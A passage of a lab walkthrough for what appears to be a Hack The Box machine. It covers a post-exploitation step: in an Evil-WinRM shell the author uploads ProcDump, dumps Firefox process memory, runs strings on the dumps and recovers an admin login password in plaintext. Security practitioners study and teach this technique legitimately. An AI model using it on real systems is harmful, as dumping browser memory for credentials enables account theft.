@@ -290,3 +290,72 @@ Lets checkout what processes are running on the machine
 *Evil-WinRM* PS C:\users\chase> ps
 ```
 We can see that the user is running firefox
+
+```console
+   1063      71   150632     513204       7.16   1992   1 firefox
+    378      28    22780     306584       1.34   2728   1 firefox
+    347      19    10268     287568       0.08   2860   1 firefox
+    401      34    35392     337216       1.75   4036   1 firefox
+    356      25    16452     297040       0.30   6320   1 firefox
+```
+
+Now lets run Procdump on the machine and first upload it. 
+
+# Uploading Procdump
+
+``console
+*Evil-WinRM* PS C:\Users\Chase\Documents> upload /home/noob2uub/tools/SysinternalsSuite/procdump64.exe
+Info: Uploading /home/noob2uub/tools/SysinternalsSuite/procdump64.exe to C:\Users\Chase\Documents\procdump64.exe
+```
+```console
+*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 1992
+
+ProcDump v10.11 - Sysinternals process dump utility
+Copyright (C) 2009-2021 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[04:56:42] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_220430_045642.dmp
+[04:56:42] Dump 1 complete: 5 MB written in 0.2 seconds
+[04:56:43] Dump count reached.
+```
+We all of the .dmp files and I already created the strings.
+
+```console
+*Evil-WinRM* PS C:\Users\Chase\Documents> dir
+
+
+    Directory: C:\Users\Chase\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/30/2022   3:38 AM      526343246 firefox.exe_220430_033825.dmp
+-a----        4/30/2022   3:38 AM      313667773 firefox.exe_220430_033843.dmp
+-a----        4/30/2022   3:38 AM      294583691 firefox.exe_220430_033849.dmp
+-a----        4/30/2022   3:39 AM      343361528 firefox.exe_220430_033915.dmp
+-a----        4/30/2022   3:39 AM      304285873 firefox.exe_220430_033930.dmp
+-a----        4/30/2022   4:24 AM      525423286 firefox.exe_220430_042438.dmp
+-a----        4/30/2022   4:56 AM        4611172 firefox.exe_220430_045642.dmp
+-a----        4/30/2022   3:18 AM         401296 procdump64.exe
+-a----        4/30/2022   4:54 AM      268745236 string.txt
+-a----        4/30/2022   4:00 AM         370056 strings.exe
+-a----        4/30/2022   4:07 AM       77909894 strings.txt
+```
+.\strings firefox.exe_220430_042438.dmp > string.txt
+
+then 
+
+download string.txt
+
+Searching the string for usernames or passwords i find this.
+
+```console
+C:\Windows\system32\
+C:\Program Files\Mozilla Firefox\firefox.exe
+"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+C:\Program Files\Mozilla Firefox\firefox.exe
+WinSta0\Default
+C:\Windows\SYSTEM32\ntdll.dll
+C:\Windows\System32
+C:\Windows\SYSTEM32;C:\Windows\system;C:\Windows;
+```
